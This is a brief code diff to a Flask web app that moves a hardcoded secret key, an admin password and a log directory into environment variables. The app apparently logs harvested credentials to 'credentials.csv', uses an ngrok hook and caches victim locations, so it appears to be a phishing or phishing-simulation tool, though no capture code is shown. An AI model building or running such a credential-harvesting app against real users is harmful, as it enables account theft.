@@ -2,6 +2,8 @@ from flask import Flask, request, render_template, jsonify, send_file, session,r
 from datetime import datetime
 import csv, os, requests
 from collections import defaultdict, Counter
+from dotenv import load_dotenv
+load_dotenv()
 
 app = Flask(__name__)
 @app.after_request
@@ -10,10 +12,10 @@ def skip_ngrok_warning(response):
     return response
 
 
-app.secret_key = 'supersecretkey'
+app.secret_key = os.getenv("SECRET_KEY")  # ✅ Use .env value
 # Constants
-ADMIN_PASSWORD = "Admin@Phish2025"
-LOG_DIR = 'logs'
+ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")  # ✅
+LOG_DIR = os.getenv("LOG_DIR", "logs")  # ✅ fallback to 'logs'
 CSV_FILE = os.path.join(LOG_DIR, 'credentials.csv')
 location_cache = {}
 
